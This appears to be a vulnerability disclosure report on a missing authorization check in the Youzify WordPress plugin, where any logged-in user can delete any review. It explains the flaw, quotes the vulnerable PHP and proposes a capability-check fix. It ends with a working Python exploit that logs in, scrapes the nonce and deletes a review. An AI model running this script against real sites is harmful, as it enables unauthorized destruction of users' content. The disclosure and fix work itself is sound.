# Summary

### Issue
**Missing Authorization**: Any logged-in user can delete reviews without sufficient permissions.

### Severity
**Critical**, as it allows unauthorized deletion of sensitive user data.

### Fix
Add a `current_user_can()` check to enforce that only users with the correct capability can delete reviews.

---

# Breakdown of the Vulnerability

### Authentication Check vs. Authorization Check
- **Authentication**: The `check_ajax_referer()` function verifies that the AJAX request is legitimate and includes the expected nonce. However, this only confirms the request comes from a logged-in user. It does **not** check if the user is authorized to delete reviews.
- **Authorization**: There is no verification that the user has the appropriate capability to delete a review. Ideally, the `delete_user_review` function should ensure that the current user has permissions to delete this review, such as a capability check with `current_user_can()`.

### Flow of Execution
1. The `delete_user_review()` function is triggered when the `youzify_delete_user_review` action is called via AJAX.
2. It retrieves the `review_id` from the AJAX request, then calls `delete_review()` without verifying if the current user has the right permissions.
3. The `delete_review()` function interacts directly with the database using `$wpdb->delete()` to remove the review based solely on `review_id`.
4. Since `delete_review()` also lacks permission checks, any logged-in user who knows the `review_id` can delete any review.

## Vulnerable Code Flow in the `youzify_delete_user_review` Action

The following code demonstrates the flow of a vulnerability in the `youzify_delete_user_review` action that allows unauthorized deletion of reviews without proper authorization checks. This code lacks a capability check, allowing any logged-in user to delete any review by providing a valid `review_id` and nonce.

```php
// Register the AJAX action
add_action( 'wp_ajax_youzify_delete_user_review', array( $this, 'delete_user_review' ) );
```
```php
function delete_user_review() {

    // Check Ajax Referer for nonce validation.
    check_ajax_referer( 'youzify-nonce', 'security' );

    do_action( 'youzify_before_delete_user_review' );

    // Get Review ID.
    $review_id = isset( $_POST['review_id'] ) ? absint( $_POST['review_id'] ) : null;

    if ( empty( $review_id ) ) {
        $response['error'] = __( "Sorry we didn't receive enough data to process this action.", 'youzify' );
        die( json_encode( $response ) );
    }

    global $Youzify;

    // Get User Query.
    $youzify_query = $Youzify->reviews->query;

    // Get Review Data.
    $review_data = $youzify_query->get_review_data( $review_id );

    if ( ! $review_data ) {
        $response['error'] = __( 'The review is already deleted or does not exist.', 'youzify' );
        die( json_encode( $response ) );
    }

    do_action( 'youzify_before_deleting_user_review', $review_id, $review_data );
    // Delete Review.
    if ( $youzify_query->delete_review( $review_id ) ) {
        // Update User Ratings Count & Rate.
        $youzify_query->update_user_reviews_count( $review_data['reviewed'] );
        $youzify_query->update_user_ratings_rate( $review_data['reviewed'] );
        $response['msg'] = __( 'The review is successfully deleted.', 'youzify' );
    }

    die( json_encode( $response ) );
}
```
```php
// Function to delete the review from the database.
function delete_review( $review_id ) {

    global $wpdb, $Youzify_reviews_table;

    // Delete Review.
    $delete = $wpdb->delete( $Youzify_reviews_table, array( 'id' => $review_id ), array( '%d' ) );

    // Get Result.
    if ( $delete ) {
        return true;
    }

    return false;
}


```
### Why This Is a Missing Authorization Bug
- **Authorization is missing at both levels**: Neither `delete_user_review()` nor `delete_review()` checks if the user has permission to delete reviews.
- This bug allows any authenticated user to delete any review by making a valid AJAX request with an existing `review_id` and nonce.

### Potential Exploits
- Since no user role or capability is checked, any logged-in user can delete reviews, even if they lack the appropriate authority (e.g., regular subscribers, customers, or other users without moderator/admin privileges).
- This vulnerability could be exploited to damage the integrity of the site’s review system, leading to loss of content and potentially impacting user trust.

---

# Severity

This is classified as a **Missing Authorization vulnerability**, specifically an arbitrary data deletion vulnerability because:
- Any logged-in user can delete data they shouldn’t be able to access.
- There is no role or capability check to enforce authorization, allowing users with insufficient privileges to delete any review.

This makes it a **critical security issue** because unauthorized users can manipulate or delete sensitive data.

---

# Suggested Fix

To mitigate this issue, you should add a permission check to `delete_user_review()` to restrict deletion access to users with the necessary capability.

### Here’s how you can update the function:

```php
function delete_user_review() {

    // Check AJAX nonce for security.
    check_ajax_referer( 'youzify-nonce', 'security' );

    // Verify that the current user has permission to delete reviews.
    if ( ! current_user_can( 'delete_others_reviews' ) ) {
        $response['error'] = __( 'You do not have permission to delete reviews.', 'youzify' );
        wp_send_json_error( $response );
        exit;
    }

    do_action( 'youzify_before_delete_user_review' );

    // Get and validate the Review ID.
    $review_id = isset( $_POST['review_id'] ) ? absint( $_POST['review_id'] ) : null;

    if ( empty( $review_id ) ) {
        $response['error'] = __( "Sorry, we didn't receive enough data to process this action.", 'youzify' );
        wp_send_json_error( $response );
        exit;
    }

    global $Youzify;

    // Get User Query.
    $youzify_query = $Youzify->reviews->query;

    // Get Review Data.
    $review_data = $youzify_query->get_review_data( $review_id );

    if ( ! $review_data ) {
        $response['error'] = __( 'The review is already deleted or does not exist.', 'youzify' );
        wp_send_json_error( $response );
        exit;
    }

    do_action( 'youzify_before_deleting_user_review', $review_id, $review_data );

    // Delete Review.
    if ( $youzify_query->delete_review( $review_id ) ) {
        // Update User Ratings Count & Rate.
        $youzify_query->update_user_reviews_count( $review_data['reviewed'] );
        $youzify_query->update_user_ratings_rate( $review_data['reviewed'] );
        $response['msg'] = __( 'The review was successfully deleted.', 'youzify' );
        wp_send_json_success( $response );
    } else {
        $response['error'] = __( 'Failed to delete the review.', 'youzify' );
        wp_send_json_error( $response );
    }

    exit;
}
```
# Missing Authentication Exploit Example

The following Python script demonstrates a missing authentication exploit in a WordPress site using AJAX. This script logs into the site, retrieves a nonce token from a specific page, and then uses this nonce to delete a review via an AJAX request.


```python
import requests
from bs4 import BeautifulSoup
import re

# Set your login credentials and site details
site_url = "https://localhost/pentest"
login_url = f"{site_url}/wp-login.php"
ajax_url = f"{site_url}/wp-admin/admin-ajax.php"

username = "username"
password = "password"
review_id = 2  # Arbitrary review ID for testing

# Start a session to maintain cookies between requests
session = requests.Session()

# Function to get the security_nonce from the page after login
def get_security_nonce(url):
    # Fetch the page content
    response = session.get(url, verify=False)
    
    # Check if the request was successful
    if response.status_code != 200:
        print(f"Failed to retrieve the page, status code: {response.status_code}")
        return None
    
    # Parse the page using BeautifulSoup
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # Find the <script> tag with the security_nonce value
    script_tag = soup.find('script', {'id': 'youzify-js-extra'})
    if script_tag:
        # Use regex to extract the security_nonce value from the JavaScript code
        match = re.search(r'"security_nonce":"([^"]+)"', script_tag.string)
        if match:
            # Return the extracted security_nonce value
            return match.group(1)
        else:
            print("security_nonce not found in the script tag.")
    else:
        print("Script tag with id 'youzify-js-extra' not found.")
    
    return None

# Step 1: Visit the login page to set the test cookie
try:
    session.get(login_url, verify=False)  # This request sets initial cookies
except requests.exceptions.RequestException as e:
    print(f"Error fetching login page: {e}")
    exit()

# Step 2: Log in to WordPress
login_data = {
    'log': username,
    'pwd': password,
    'wp-submit': 'Log In',
    'redirect_to': site_url,
    'testcookie': '1'  # WordPress uses this to verify cookies are enabled
}
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded'
}

# Attempt to login
try:
    login_response = session.post(login_url, data=login_data, headers=headers, verify=False)
    login_response.raise_for_status()
    
    # Check if login was successful by examining response content
    if "login_error" in login_response.text:
        print("Login failed with error message:")
        print(login_response.text)
    elif "dashboard" not in login_response.text:
        print("Login failed. The dashboard was not found in the response.")
    else:
        print("Logged in successfully.")
        
        # Step 3: Fetch the security_nonce from the page after successful login
        nonce = get_security_nonce(f"{site_url}/members")
        if not nonce:
            print("Failed to retrieve the security_nonce.")
            exit()

        # Step 4: Send the AJAX request to delete the review
        ajax_data = {
            'action': 'youzify_delete_user_review',
            'security': nonce,  # Use the nonce value fetched after login
            'review_id': review_id  # Arbitrary ID to trigger the "does not exist" message
        }

        # Make the POST request to the AJAX handler
        ajax_response = session.post(ajax_url, data=ajax_data, headers=headers, verify=False)
            
        # Debugging output for better understanding of the request and response
        print("AJAX request sent to:", ajax_url)
        print("AJAX request data:", ajax_data)
        print("AJAX response status:", ajax_response.status_code)
        print("AJAX response headers:", ajax_response.headers)
            
        # Check if the AJAX request was successful
        if ajax_response.ok:
            try:
                print("AJAX response received:")
                print(ajax_response.json())
            except ValueError:
                print("Received a non-JSON response from AJAX request:")
                print(ajax_response.text)
        else:
            print(f"Failed to reach the AJAX endpoint. HTTP Status: {ajax_response.status_code}")
            print(f"Response text: {ajax_response.text}") 
            
except requests.exceptions.HTTPError as err:
    print(f"HTTP error occurred: {err}")
except requests.exceptions.RequestException as e:
    print(f"Error: {e}")
